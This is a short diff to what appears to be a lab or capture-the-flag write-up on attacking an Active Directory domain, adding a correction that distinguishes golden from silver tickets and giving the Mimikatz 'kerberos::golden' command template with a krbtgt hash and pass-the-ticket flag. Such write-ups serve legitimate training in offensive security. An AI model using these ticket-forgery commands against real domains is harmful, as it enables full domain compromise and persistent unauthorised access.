@@ -431,6 +431,13 @@ Lifetime  : 6/3/2023 10:14:41 AM ; 5/31/2033 10:14:41 AM ; 5/31/2033 10:14:41 AM
 Golden ticket for 'Administrator @ corp.thereserve.loc' successfully submitted for current session
 ```
 
+Although I've been pointed out, that specific method more like to get a silver ticket. 
+The Golden ticket command doesn't have `/service`:
+
+```cmd
+kerberos::golden /user:[user] /domain:[domain] /sid:[sid_without_rid] /krbtgt:[NTLM_hash_krbtgt] /ptt
+```
+
 ##### Use(Pass) the Golden Ticket
 ```powershell
 misc::cmd
